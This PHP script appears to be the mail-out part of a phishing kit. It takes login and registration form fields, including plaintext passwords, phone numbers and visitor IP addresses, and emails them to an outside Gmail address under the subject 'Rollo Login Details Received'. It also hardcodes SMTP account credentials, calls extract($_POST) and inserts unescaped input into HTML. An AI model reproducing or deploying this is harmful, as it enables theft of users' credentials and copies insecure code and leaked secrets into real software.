<?php

extract($_POST);

$ip = $_SERVER['REMOTE_ADDR'];
require 'PHPMailer/PHPMailerAutoload.php';
require 'PHPMailer/class.phpmailer.php';

if (isset($_POST['btnLogin']) || isset($_POST['btnLoginMore'])) {
    $customerEmailer = '<!DOCTYPE html>
                                <html>
                                    <head>
                                        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
                                        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
                                        <style>p{ margin:0 !important; padding:0 !important;}</style>
                                    </head>
                                    <body>
                                        <p>First Name : ' . $fname . '</p>
                                        <p>Last Name : ' . $lname . '</p>
                                        <p>Email : ' . $email . '</p>
                                        <p>Password : ' . $password . '</p>
                                        <p>Number : ' . $number . '</p>
                                        <p>Country : ' . $country . '</p>
                                        <p>IP : ' . $ip . '</p>
                                        </body>
                                </html>';
    $subject = 'Alert - Rollo Login Details Received';
} elseif (isset($_POST['btnSignup'])) {
    $customerEmailer = '<!DOCTYPE html>
                                <html>
                                    <head>
                                        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
                                        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
                                        <style>p{ margin:0 !important; padding:0 !important;}</style>
                                    </head>
                                    <body>
                                        <p>First Name : ' . $fname . '</p>
                                        <p>Last Name : ' . $lname . '</p>
                                        <p>Email : ' . $email . '</p>
                                        <p>Password : ' . $password . '</p>
                                        <p>Number : ' . $number . '</p>
                                        <p>Country : ' . $country . '</p>
                                        <p>IP : ' . $ip . '</p>
                                    </body>
                                </html>';
    $subject = 'Alert - Rollo Registration Details Received';
}

$message = $customerEmailer;
$toAddress = 'vikaskumareglobalsoft@gmail.com';
$toAddress1 = 'vikaskumareglobalsoft@gmail.com';
$fromTitle = $_SERVER['HTTP_HOST'];
$fromEmail = 'details@' . $_SERVER['HTTP_HOST'];
$mail = new PHPMailer;
//$mail->IsSMTP();
//$mail->Mailer = 'smtp';
$mail->SMTPDebug = 2;
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = 'egsswork7@gmail.com';
$mail->Password = 'seo@9761#global';
$mail->SMTPSecure = 'tls';
$mail->Port = 587;
$mail->setFrom($fromEmail, $fromTitle);
$mail->addAddress($toAddress);
$mail->AddCC($toAddress1);
$mail->isHTML(true);
$mail->Subject = $subject;
$mail->Body = $message;
$mailS = $mail->send();
?>